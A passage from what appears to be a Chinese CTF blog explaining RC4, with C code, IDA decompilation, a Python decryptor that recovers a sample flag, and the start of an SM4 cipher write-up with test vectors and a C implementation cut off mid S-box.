class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i] = i;</span><br><span class="line">		k[i] = key[i%Len];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">		tmp = s[i];</span><br><span class="line">		s[i] = s[j]; <span class="comment">// 交换s[i]和s[j]</span></span><br><span class="line">		s[j] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">		tmp = s[i];</span><br><span class="line">		s[i] = s[j]; <span class="comment">// 交换s[x]和s[y]</span></span><br><span class="line">		s[j] = tmp;</span><br><span class="line">		t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">		Data[k] ^= s[t];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// S-box</span></span><br><span class="line">	<span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">"justfortest"</span> &#125;;</span><br><span class="line">	<span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">"这是一个用来加密的数据Data"</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"pData=%s\n"</span>, pData);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"key=%s,length=%d\n\n"</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">	rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key)); <span class="comment">// 已经完成了初始化</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"完成对S[i]的初始化，如下：\n\n"</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%02X"</span>, s[i]);</span><br><span class="line">		<span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="comment">// 用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">	&#123;</span><br><span class="line">		s2[i] = s[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"已经初始化，现在加密:\n\n"</span>);</span><br><span class="line">	rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len); <span class="comment">// 加密</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"已经加密，现在解密:\n\n"</span>);</span><br><span class="line">	rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len); <span class="comment">// 解密</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\thunder&gt;<span class="string">"D:\AlgorithmTest.exe"</span></span><br><span class="line">pData=这是一个用来加密的数据Data</span><br><span class="line">key=justfortest,length=11</span><br><span class="line"></span><br><span class="line">完成对S[i]的初始化，如下：</span><br><span class="line"></span><br><span class="line">21E0944A8CAA5C851A95374358840E32</span><br><span class="line">EE3AF7C8F67F898BFF52235F3B51CAE6</span><br><span class="line">31E2A570C698C046CE836EB91EBC9235</span><br><span class="line">FD6B1CB62C2D69B565631B933EA60762</span><br><span class="line">13EAE7775BA159DD745491C181B7FB49</span><br><span class="line">66037D2E47331538F8A820AE22D2345A</span><br><span class="line">64FA3F87714DFCBF2490D32ADF9EB85E</span><br><span class="line">0A2780E40CAD1497E3D8C7F2F4424176</span><br><span class="line">DC8D45A9789DE1B0D9044F0F36C3C5BE</span><br><span class="line">4C7AEB6C4B8640E59A7919B39BABAFE8</span><br><span class="line">C4AC8EFE963CEDEF0B091202BAB1D001</span><br><span class="line">CB60D4F91D557BCC7544D750F17E67C9</span><br><span class="line">88DB111826F0B299B4BB482BA41FF58A</span><br><span class="line">C2E9A0CF5DDA6FCD57003D0830A2A316</span><br><span class="line">9F0D6AF36D682F8FBD28A7DE4ED15373</span><br><span class="line">7C2956D51706058225EC617210399CD6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">已经初始化，现在加密:</span><br><span class="line"></span><br><span class="line">pData=?獤       5Ws?g&amp;W鋟覈?T?</span><br><span class="line"></span><br><span class="line">已经加密，现在解密:</span><br><span class="line"></span><br><span class="line">pData=这是一个用来加密的数据Data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\thunder&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码是rc4加密字符串<code>这是一个用来加密的数据Data</code>，key = <code>justfortest</code>，我们放入IDA观察，初始化函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">rc4_init</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">int</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// STDF_1</span></span><br><span class="line">  <span class="keyword">char</span> k[<span class="number">256</span>]; <span class="comment">// [esp+DCh] [ebp-120h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+1E4h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1F0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  k[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  j__memset(&amp;k[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    s[i] = i;</span><br><span class="line">    k[i] = key[i % Len];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    j = (k[i] + j + (<span class="keyword">unsigned</span> __int8)s[i]) % <span class="number">256</span>;</span><br><span class="line">    tmp = s[i];</span><br><span class="line">    s[i] = s[j];</span><br><span class="line">    s[j] = tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加密函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">int</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// STD3_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; Len; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    j = (j + (<span class="keyword">unsigned</span> __int8)s[i]) % <span class="number">256</span>;</span><br><span class="line">    tmp = s[i];</span><br><span class="line">    s[i] = s[j];</span><br><span class="line">    s[j] = tmp;</span><br><span class="line">    Data[k] ^= s[((<span class="keyword">unsigned</span> __int8)s[j] + (<span class="keyword">unsigned</span> __int8)s[i]) % <span class="number">256</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h1><p>从IDA中可以看到有很多的 %256 操作，因为 s 盒的长度为256，所以这里很好判断，如果在CTF逆向过程中看到有多次 %256 的操作最后又有异或的话那可以考虑是否是RC4密码</p>
<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><p>python实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random, base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tencode</span><span class="params">(data, key, encode=base64.b64encode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 encryption with random salt and final encoding"""</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(salt_length):</span><br><span class="line">        salt += chr(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdecode</span><span class="params">(data, key, decode=base64.b64decode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 decryption of encoded data"""</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">    salt = data[:salt_length]</span><br><span class="line">    <span class="keyword">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 需要解密的数据</span></span><br><span class="line">    data = <span class="string">'UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw=='</span></span><br><span class="line">    <span class="comment"># 密钥</span></span><br><span class="line">    key = <span class="string">'welcometoicqedu'</span></span><br><span class="line">    <span class="comment"># 解码</span></span><br><span class="line">    decoded_data = tdecode(data=data, key=key)</span><br><span class="line">    print(<span class="string">"明文是："</span>)</span><br><span class="line">    <span class="keyword">print</span> decoded_data</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[Running] python -u <span class="string">"/home/thunder/Desktop/CTF/crypt/example/rc4_example/test.py"</span></span><br><span class="line">明文是：</span><br><span class="line">flag&#123;rc4_l_keepgoing&#125;</span><br><span class="line"></span><br><span class="line">[Done] exited <span class="keyword">with</span> code=<span class="number">0</span> <span class="keyword">in</span> <span class="number">0.14</span> seconds</span><br></pre></td></tr></table></figure>
<p>在线解密网站：<a href="https://www.sojson.com/encrypt_rc4.html" target="_blank" rel="noopener">https://www.sojson.com/encrypt_rc4.html</a></p>
<p>参考链接：</p>
<p><a href="https://blog.csdn.net/Fly_hps/article/details/79918495" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/79918495</a></p>
<p><a href="https://baike.baidu.com/item/RC4/3454548?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/RC4/3454548?fr=aladdin</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>密码篇</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学逆向之SM4</title>
    <url>/2019/05/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E9%80%86%E5%90%91%E4%B9%8BSM4/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>SM4.0（原名SMS4.0）是中华人民共和国政府采用的一种分组密码标准，由国家密码管理局于2012年3月21日发布。相关标准为“GM/T 0002-2012《SM4分组密码算法》（原SMS4分组密码算法）”。在商用密码体系中，SM4主要用于数据加密，其算法公开，分组长度与密钥长度均为128bit，加密算法与密钥扩展算法都采用32轮非线性迭代结构，S盒为固定的8比特输入8比特输出。SM4.0中的指令长度被提升到大于64K（即64×1024）的水平，这是SM 3.0规格（渲染指令长度允许大于512）的128倍。</p>
<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p>这里我简要介绍一下<strong>SM4</strong>算法，详细的过程可以查看参考链接，首先我们要知道<strong>SM4</strong>是一个对称加密算法，也就是说加密和解密的密钥相同，首先我们要清楚下面几个概念</p>
<ul>
<li><p><strong>SM4</strong>是分组密码，所以我们要将明文分组，将明文分成128位一组</p>
<p><img src="/2019/05/21/密码学逆向之SM4/1.png" alt="1"></p>
</li>
<li><p>S(Sbox)盒负责置换我们的明文</p>
<p><img src="/2019/05/21/密码学逆向之SM4/2.png" alt="2"></p>
</li>
<li><p>因为<strong>SM4</strong>面向的是32bit的字(word)，S盒处理的是两个16进制数也就是8bit的字节，所以我们要用4个S盒来置换</p>
<p><img src="/2019/05/21/密码学逆向之SM4/3.png" alt="3"></p>
</li>
<li><p>轮函数F的概念如下图，以字为单位进行加密运算，称一次迭代运算为一轮变换</p>
<p><img src="/2019/05/21/密码学逆向之SM4/4.png" alt="4"></p>
</li>
<li><p>合成置换T就是非线性变换和线性变换的一个组合过程</p>
<p><img src="/2019/05/21/密码学逆向之SM4/5.png" alt="5"></p>
</li>
</ul>
<p>了解上述一些概念之后加密解密的过程如下图</p>
<p><img src="/2019/05/21/密码学逆向之SM4/6.png" alt="6"></p>
<p>在SM4算法中，轮秘钥的产生是通过用户选择主秘钥作为基本的秘钥数据，在通过一些算法生成轮秘钥，在密钥拓展中，我们通过一些常数对用户选择的主钥进行操作，增大随机性。密钥扩展算法如下</p>
<p><img src="/2019/05/21/密码学逆向之SM4/7.png" alt="7"></p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>代码出自<a href="https://blog.csdn.net/cg129054036/article/details/83012721" target="_blank" rel="noopener">这里</a></p>
<p>sm4.c加密解密函数的实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sm4.c</span></span><br><span class="line"><span class="comment">// Test vector 1</span></span><br><span class="line"><span class="comment">// plain: 01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10</span></span><br><span class="line"><span class="comment">// key:   01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10</span></span><br><span class="line"><span class="comment">// 	   round key and temp computing result:</span></span><br><span class="line"><span class="comment">// 	   rk[ 0] = f12186f9 X[ 0] = 27fad345</span></span><br><span class="line"><span class="comment">// 		   rk[ 1] = 41662b61 X[ 1] = a18b4cb2</span></span><br><span class="line"><span class="comment">// 		   rk[ 2] = 5a6ab19a X[ 2] = 11c1e22a</span></span><br><span class="line"><span class="comment">// 		   rk[ 3] = 7ba92077 X[ 3] = cc13e2ee</span></span><br><span class="line"><span class="comment">// 		   rk[ 4] = 367360f4 X[ 4] = f87c5bd5</span></span><br><span class="line"><span class="comment">// 		   rk[ 5] = 776a0c61 X[ 5] = 33220757</span></span><br><span class="line"><span class="comment">// 		   rk[ 6] = b6bb89b3 X[ 6] = 77f4c297</span></span><br><span class="line"><span class="comment">// 		   rk[ 7] = 24763151 X[ 7] = 7a96f2eb</span></span><br><span class="line"><span class="comment">// 		   rk[ 8] = a520307c X[ 8] = 27dac07f</span></span><br><span class="line"><span class="comment">// 		   rk[ 9] = b7584dbd X[ 9] = 42dd0f19</span></span><br><span class="line"><span class="comment">// 		   rk[10] = c30753ed X[10] = b8a5da02</span></span><br><span class="line"><span class="comment">// 		   rk[11] = 7ee55b57 X[11] = 907127fa</span></span><br><span class="line"><span class="comment">// 		   rk[12] = 6988608c X[12] = 8b952b83</span></span><br><span class="line"><span class="comment">// 		   rk[13] = 30d895b7 X[13] = d42b7c59</span></span><br><span class="line"><span class="comment">// 		   rk[14] = 44ba14af X[14] = 2ffc5831</span></span><br><span class="line"><span class="comment">// 		   rk[15] = 104495a1 X[15] = f69e6888</span></span><br><span class="line"><span class="comment">// 		   rk[16] = d120b428 X[16] = af2432c4</span></span><br><span class="line"><span class="comment">// 		   rk[17] = 73b55fa3 X[17] = ed1ec85e</span></span><br><span class="line"><span class="comment">// 		   rk[18] = cc874966 X[18] = 55a3ba22</span></span><br><span class="line"><span class="comment">// 		   rk[19] = 92244439 X[19] = 124b18aa</span></span><br><span class="line"><span class="comment">// 		   rk[20] = e89e641f X[20] = 6ae7725f</span></span><br><span class="line"><span class="comment">// 		   rk[21] = 98ca015a X[21] = f4cba1f9</span></span><br><span class="line"><span class="comment">// 		   rk[22] = c7159060 X[22] = 1dcdfa10</span></span><br><span class="line"><span class="comment">// 		   rk[23] = 99e1fd2e X[23] = 2ff60603</span></span><br><span class="line"><span class="comment">// 		   rk[24] = b79bd80c X[24] = eff24fdc</span></span><br><span class="line"><span class="comment">// 		   rk[25] = 1d2115b0 X[25] = 6fe46b75</span></span><br><span class="line"><span class="comment">// 		   rk[26] = 0e228aeb X[26] = 893450ad</span></span><br><span class="line"><span class="comment">// 		   rk[27] = f1780c81 X[27] = 7b938f4c</span></span><br><span class="line"><span class="comment">// 		   rk[28] = 428d3654 X[28] = 536e4246</span></span><br><span class="line"><span class="comment">// 		   rk[29] = 62293496 X[29] = 86b3e94f</span></span><br><span class="line"><span class="comment">// 		   rk[30] = 01cf72e5 X[30] = d206965e</span></span><br><span class="line"><span class="comment">// 		   rk[31] = 9124a012 X[31] = 681edf34</span></span><br><span class="line"><span class="comment">// cypher: 68 1e df 34 d2 06 96 5e 86 b3 e9 4f 53 6e 42 46</span></span><br><span class="line"><span class="comment">// 		</span></span><br><span class="line"><span class="comment">// test vector 2</span></span><br><span class="line"><span class="comment">// the same key and plain 1000000 times coumpting </span></span><br><span class="line"><span class="comment">// plain:  01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10</span></span><br><span class="line"><span class="comment">// key:    01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10</span></span><br><span class="line"><span class="comment">// cypher: 59 52 98 c7 c6 fd 27 1f 04 02 f8 04 c3 3d 3f 66</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sm4.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 32-bit integer manipulation macros (big endian)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> GET_ULONG_BE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ULONG_BE(n,b,i)                             \</span></span><br><span class="line">&#123;                                                       \</span><br><span class="line">    (n) = ( (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (b)[(i)    ] &lt;&lt; <span class="number">24</span> )        \</span><br><span class="line">        | ( (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (b)[(i) + <span class="number">1</span>] &lt;&lt; <span class="number">16</span> )        \</span><br><span class="line">        | ( (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (b)[(i) + <span class="number">2</span>] &lt;&lt;  <span class="number">8</span> )        \</span><br><span class="line">        | ( (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (b)[(i) + <span class="number">3</span>]       );       \</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PUT_ULONG_BE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_ULONG_BE(n,b,i)                             \</span></span><br><span class="line">&#123;                                                       \</span><br><span class="line">    (b)[(i)    ] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ( (n) &gt;&gt; <span class="number">24</span> );       \</span><br><span class="line">    (b)[(i) + <span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ( (n) &gt;&gt; <span class="number">16</span> );       \</span><br><span class="line">    (b)[(i) + <span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ( (n) &gt;&gt;  <span class="number">8</span> );       \</span><br><span class="line">    (b)[(i) + <span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ( (n)       );       \</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*rotate shift left marco definition</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Expanded SM4 S-boxes</span></span><br><span class="line"><span class="comment">/* Sbox table: 8bits input convert to 8 bits output*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> SboxTable[<span class="number">16</span>][<span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line">	&#123; <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span 